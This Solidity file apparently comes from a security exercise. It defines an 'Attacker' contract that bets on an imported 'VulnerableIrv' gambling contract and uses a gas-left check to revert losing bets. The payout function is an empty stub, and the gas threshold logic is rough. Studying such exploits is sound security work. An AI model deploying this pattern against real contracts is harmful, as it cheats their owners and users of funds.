// SPDX-License-Identifier: MIT
// pragma solidity ^0.4.0;
pragma solidity ^0.6.0;

import "./VulnerableIrv.sol";

contract Attacker {
    VulnerableIrv public victim;

    // Constructor to set the Victim contract address
    // v0.4.0: constructor needs to have same as the contract
    // function Attacker(address _victimAddress) public {
    // v0.6.0
    constructor(address _victimAddress) public {
        victim = VulnerableIrv(_victimAddress);
    }

    function exploit(uint256 betGuess) public payable {
        // v0.6.0:
        require(msg.value >= 1 ether, "Minimum bet of 1 ether required");
        // v0.4.0: 
        // if (msg.value < 1 ether) throw;

        // Call the draw function on the Victim contract
        victim.draw.value(msg.value)(betGuess);

        // check if extra gas was used (e.g., winner written, i.e. bet was successful)
        require(gasleft() < 5000000, "Exploit failed");
    }

    // Function to collect any winnings
    function collectWinnings() public {
        // Logic to collect winnings (if any)
    }
}